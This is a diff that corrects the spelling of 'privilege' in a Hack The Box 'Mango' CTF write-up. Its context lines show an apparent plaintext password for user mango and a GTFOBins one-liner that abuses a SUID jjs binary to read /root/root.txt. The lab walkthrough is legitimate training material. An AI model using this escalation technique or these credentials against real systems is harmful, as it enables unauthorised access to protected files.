@@ -158,7 +158,7 @@ Getting user account I checked the /robots.txt, also ran gobuster, nothing usefu
     </li>
     <li><a href="#getting-root-account">Getting root account</a>
       <ul>
-        <li><a href="#priviledge-escalation-with-jjs">Priviledge escalation with JJS</a></li>
+        <li><a href="#privilege-escalation-with-jjs">Privilege escalation with JJS</a></li>
       </ul>
     </li>
   </ul>
@@ -253,7 +253,7 @@ mango:h3mXK8RhU~f{]f5H
 <p>First, I switch from sh to bash by running /bin/bash.</p>
 <p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
 <p><img src="https://ajdintrejic.github.io/htb-mango/jjs.png" alt="jjs"></p>
-<h3 id="priviledge-escalation-with-jjs">Priviledge escalation with JJS</h3>
+<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS</h3>
 <p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
 <pre><code>echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs
 </code></pre><p><img src="https://ajdintrejic.github.io/htb-mango/root_txt.png" alt="roottxt"></p>
